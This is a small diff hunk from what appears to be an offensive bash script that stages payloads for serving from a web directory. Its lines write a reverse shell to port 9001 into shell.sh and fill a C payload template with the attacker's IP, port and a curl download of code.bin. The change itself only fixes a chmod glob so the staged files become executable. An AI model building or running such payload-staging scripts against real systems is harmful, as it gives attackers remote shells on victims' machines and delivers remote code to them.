@@ -88,7 +88,7 @@ else
 
 fi
 echo -ne "#!/bin/bash\nbash -i >& /dev/tcp/$SELF/9001 0>&1" >> "$HOME/www/shell.sh"
-chmod +x "$HOME/www/*"
+chmod +x "$HOME/www/"*
 sed -i "s/REPLACE_THIS_COMMAND/curl http:\/\/$SELF\/code.bin/g" "$HOME/www/shell.c"
 sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/shell.c"
 sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/shell.c"
